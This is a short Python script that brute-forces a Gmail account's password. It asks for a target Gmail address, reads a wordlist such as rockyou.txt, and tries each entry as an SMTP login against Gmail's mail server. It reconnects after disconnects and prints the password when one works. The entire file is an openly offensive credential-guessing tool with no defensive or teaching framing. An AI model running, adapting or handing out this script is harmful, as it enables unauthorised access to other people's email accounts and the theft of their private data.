import smtplib
import sys
import time

def brute_force_login(user, password_list):
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()

    for password in password_list:
        password = password.strip().decode('utf-8')  # Decode bytes to string
        try:
            smtpserver.login(user, password)
            print("Password Found:", password)
            smtpserver.quit()
            return True
        except smtplib.SMTPAuthenticationError:
            print("Password Wrong:" ,password)
        except smtplib.SMTPServerDisconnected as e:
            print("Connection to SMTP server unexpectedly closed:", e)
            print("Retrying in 10 seconds...")
            time.sleep(10)
            smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
            smtpserver.ehlo()
            smtpserver.starttls()
    smtpserver.quit()
    return False

def main():
    user = input("Target Gmail Address: ")
    print()

    password_list_option = input("'0' for rockyou.txt \n'1' for other list \n: ")

    if password_list_option == '0':
        passswfile = "rockyou.txt"
    elif password_list_option == '1':
        passswfile = input("Enter the file path for the password list: ")
    else:
        print("\nInvalid input!")
        sys.exit(1)

    try:
        with open(passswfile, "rb") as password_file:
            passwords = password_file.readlines()
    except FileNotFoundError:
        print("File not found:", passswfile)
        sys.exit(1)

    if brute_force_login(user, passwords):
        print("Password found! Exiting...")
    else:
        print("Password not found in the provided list.")

if __name__ == "__main__":
    main()
